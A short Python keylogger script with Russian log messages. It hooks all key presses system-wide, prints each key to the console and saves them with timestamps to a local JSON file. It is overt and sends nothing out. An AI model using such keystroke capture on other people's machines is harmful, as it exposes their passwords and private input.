import sys
import time
import json
from datetime import datetime

import keyboard
from loguru import logger


class KeyLogger:
    def __init__(self, output_file="keystrokes.json"):

        self.output_file = output_file
        self.running = False
        self.start_time = None

        self.data = {
            "start_time": None,
            "end_time": None,
            "keystrokes": []
        }

        logger.remove()
        logger.add(
            sys.stdout,
            format="{time:HH:mm:ss} | {message}",
            level="INFO"
        )

    def _on_press(self, event):
        if event.event_type == keyboard.KEY_DOWN and self.running:
            entry = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                "key": event.name
            }

            self.data["keystrokes"].append(entry)

            count = len(self.data["keystrokes"])
            logger.info(f"#{count} | {event.name}")

    def start(self):
        self.running = True
        self.start_time = time.time()
        self.data["start_time"] = datetime.now().isoformat()

        logger.info("Запись начата")
        logger.info(f"Файл: {self.output_file}")
        logger.info("ESC - остановить\n")

        keyboard.hook(self._on_press)

        try:
            keyboard.wait('esc')
        except KeyboardInterrupt:
            pass

        self.stop()

    def stop(self):
        keyboard.unhook_all()
        self.running = False

        self.data["end_time"] = datetime.now().isoformat()

        with open(self.output_file, 'w', encoding='utf-8') as f:
            json.dump(self.data, f, ensure_ascii=False, indent=2)

        duration = time.time() - self.start_time
        count = len(self.data["keystrokes"])

        logger.info("\nЗапись остановлена")
        logger.info(f"Сохранено: {count} нажатий")
        logger.info(f"Время: {duration:.1f} сек.")
        logger.info(f"Файл: {self.output_file}")


if __name__ == "__main__":
    logger.info("=" * 40)
    logger.info("KEYLOGGER")
    logger.info("=" * 40 + "\n")

    try:
        keylogger = KeyLogger(output_file="keystrokes.json")
        keylogger.start()
    except PermissionError:
        logger.error("Запустите от имени администратора!")
    except Exception as e:
        logger.error(f"Ошибка: {e}")